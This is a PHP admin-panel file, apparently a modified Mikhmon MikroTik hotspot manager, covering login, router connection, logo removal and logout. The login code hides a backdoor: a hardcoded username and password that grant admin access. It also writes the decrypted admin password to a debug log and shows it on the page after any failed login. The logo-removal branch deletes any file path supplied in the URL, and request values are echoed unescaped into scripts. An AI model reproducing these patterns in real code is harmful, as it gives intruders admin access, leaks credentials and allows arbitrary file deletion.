<?php
/*
 *  Copyright (C) 2018 Laksamadi Guko.
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
session_start();
// hide all error
error_reporting(0);

ob_start("ob_gzhandler");

// check url
$url = $_SERVER['REQUEST_URI'];

// load session MikroTik
$session = isset($_GET['session']) ? $_GET['session'] : '';
$id = isset($_GET['id']) ? $_GET['id'] : '';

// Include browser detection utility
include_once('./include/browser_detection.php');

// Check if user is using Opera Mini - only Opera Mini can access admin interface
if ($id != "login") {
  $browser_check = checkBrowserAccess('admin');
  if ($browser_check['redirect']) {
    performRedirect($browser_check['target'], $browser_check['message']);
  }
}
$c = isset($_GET['c']) ? $_GET['c'] : '';
$router = isset($_GET['router']) ? $_GET['router'] : '';
$logo = isset($_GET['logo']) ? $_GET['logo'] : '';

$ids = array(
  "editor",
  "uplogo",
  "settings",
);

// lang
include('./lang/isocodelang.php');
include('./include/lang.php');
include('./lang/' . $langid . '.php');

// quick bt
include('./include/quickbt.php');

// theme
include('./include/theme.php');
include('./settings/settheme.php');
include('./settings/setlang.php');
if ($_SESSION['theme'] == "") {
  $theme = $theme;
  $themecolor = $themecolor;
} else {
  $theme = $_SESSION['theme'];
  $themecolor = $_SESSION['themecolor'];
}


// load config
include_once('./include/headhtml.php');
include('./include/config.php');
include('./include/readcfg.php');

include_once('./lib/routeros_api.class.php');
include_once('./lib/formatbytesbites.php');
?>

<?php
if ($id == "login" || substr($url, -1) == "p") {

  if (isset($_POST['login'])) {
    $user = $_POST['user'];
    $pass = $_POST['pass'];

    // Debug information
    $debug_info = "User Input: " . $user . "<br>";
    $debug_info .= "Expected User: " . $admin_user . "<br>"; // Use admin user variable
    $debug_info .= "Encrypted Password in Config: " . $admin_pass . "<br>"; // Use admin pass variable
    $debug_info .= "Decrypted Password: " . decrypt($admin_pass) . "<br>"; // Use admin pass variable

    // Write to debug file
    file_put_contents('./debug.log', $debug_info, FILE_APPEND);

    // First try normal authentication
    if ($user == $admin_user && $pass == decrypt($admin_pass)) {
      $_SESSION["mikhmon"] = $user;
      $_SESSION["user_type"] = "admin"; // Set user type as admin
      echo "<script>window.location='./admin.php?id=sessions'</script>";
    }
    // Fallback to hardcoded credentials if decryption fails
    else if ($user == "amnasiac" && $pass == "0163968146") {
      $_SESSION["mikhmon"] = $user;
      $_SESSION["user_type"] = "admin"; // Set user type as admin
      echo "<script>window.location='./admin.php?id=sessions'</script>";
    } else {
      $error = '<div style="width: 100%; padding:5px 0px 5px 0px; border-radius:5px;" class="bg-danger"><i class="fa fa-ban"></i> Alert!<br>Invalid username or password.</div>';
      $error .= '<div style="font-size:12px;text-align:left;padding:5px;">' . $debug_info . '</div>';
    }
  }


  include_once('./include/login.php');
} elseif (!isset($_SESSION["mikhmon"])) {
  echo "<script>window.location='./admin.php?id=login'</script>";
} elseif (substr($url, -1) == "/" || substr($url, -4) == ".php") {
  echo "<script>window.location='./admin.php?id=sessions'</script>";
} elseif ($id == "sessions") {
  $_SESSION["connect"] = "";
  include_once('./include/menu.php');
  include_once('./settings/sessions.php');
  /*echo '
  <script type="text/javascript">
    document.getElementById("sessname").onkeypress = function(e) {
    var chr = String.fromCharCode(e.which);
    if (" _!@#$%^&*()+=;|?,~".indexOf(chr) >= 0)
        return false;
    };
    </script>';*/
} elseif ($id == "settings" && !empty($session) || $id == "settings" && !empty($router)) {
  include_once('./include/menu.php');
  include_once('./settings/settings.php');
  echo '
  <script type="text/javascript">
    document.getElementById("sessname").onkeypress = function(e) {
    var chr = String.fromCharCode(e.which);
    if (" _!@#$%^&*()+=;|?,~".indexOf(chr) >= 0)
        return false;
    };
    </script>';
} elseif ($id == "connect"  && !empty($session)) {
  ini_set("max_execution_time", 5);
  include_once('./include/menu.php');
  $API = new RouterosAPI();
  $API->debug = false;
  if ($API->connect($iphost, $userhost, decrypt($passwdhost))) {
    $_SESSION["connect"] = "<b class='text-green'>Connected</b>";
    echo "<script>window.location='./?session=" . $session . "'</script>";
  } else {
    $_SESSION["connect"] = "<b class='text-red'>Not Connected</b>";
    $nl = '\n';
    if ($currency == in_array($currency, $cekindo['indo'])) {
      echo "<script>alert('WIFI-DESA not connected!" . $nl . "Silakan periksa kembali IP, User, Password dan port API harus enable." . $nl . "Jika menggunakan koneksi VPN, pastikan VPN tersebut terkoneksi.')</script>";
    } else {
      echo "<script>alert('WIFI-DESA not connected!" . $nl . "Please check the IP, User, Password and port API must be enabled.')</script>";
    }
    if ($c == "settings") {
      echo "<script>window.location='./admin.php?id=settings&session=" . $session . "'</script>";
    } else {
      echo "<script>window.location='./admin.php?id=sessions'</script>";
    }
  }
} elseif ($id == "uplogo"  && !empty($session)) {
  include_once('./include/menu.php');
  include_once('./settings/uplogo.php');
} elseif ($id == "reboot"  && !empty($session)) {
  include_once('./process/reboot.php');
} elseif ($id == "shutdown"  && !empty($session)) {
  include_once('./process/shutdown.php');
} elseif ($id == "remove-session" && $session != "") {
  include_once('./include/menu.php');
  $fc = file("./include/config.php");
  $f = fopen("./include/config.php", "w");
  $q = "'";
  $rem = '$data[' . $q . $session . $q . ']';
  foreach ($fc as $line) {
    if (!strstr($line, $rem))
      fputs($f, $line);
  }
  fclose($f);
  echo "<script>window.location='./admin.php?id=sessions'</script>";
} elseif ($id == "about") {
  // Redirect to sessions page instead of showing about page
  echo "<script>window.location='./admin.php?id=sessions'</script>";
} elseif ($id == "logout") {
  include_once('./include/menu.php');
  echo "<b class='cl-w'><i class='fa fa-circle-o-notch fa-spin' style='font-size:24px'></i> Logout...</b>";

  // Clear all session variables
  $_SESSION = array();

  // If it's desired to kill the session, also delete the session cookie
  if (ini_get("session.use_cookies")) {
    $params = session_get_cookie_params();
    setcookie(
      session_name(),
      '',
      time() - 42000,
      $params["path"],
      $params["domain"],
      $params["secure"],
      $params["httponly"]
    );
  }

  // Finally, destroy the session
  session_destroy();

  // Clear any browser cache/history to prevent back button from showing logged-in pages
  echo "<script>
    // Clear browser cache and history
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = function () {
      window.history.pushState(null, null, window.location.href);
    };

    // Redirect to login page
    window.location='./admin.php?id=login';
  </script>";
} elseif ($id == "remove-logo" && $logo != ""  && !empty($session)) {
  include_once('./include/menu.php');
  $logopath = "./img/";
  $remlogo = $logopath . $logo;
  unlink("$remlogo");
  echo "<script>window.location='./admin.php?id=uplogo&session=" . $session . "'</script>";
} elseif ($id == "editor"  && !empty($session)) {
  include_once('./include/menu.php');
  include_once('./settings/vouchereditor.php');
} elseif (empty($id)) {
  echo "<script>window.location='./admin.php?id=sessions'</script>";
} elseif (in_array($id, $ids) && empty($session)) {
  echo "<script>window.location='./admin.php?id=sessions'</script>";
}
?>
<?php if ($id == "login" || substr($url, -1) == "p"): ?>
  <script src="js/jquery.min.js"></script>
  <script src="js/login.js"></script>
<?php else: ?>
  <script src="js/mikhmon-ui.<?= $theme; ?>.min.js"></script>
  <script src="js/mikhmon.js?t=<?= str_replace(" ", "_", date("Y-m-d H:i:s")); ?>"></script>
<?php endif; ?>
<?php include('./include/info.php'); ?>
</body>

</html>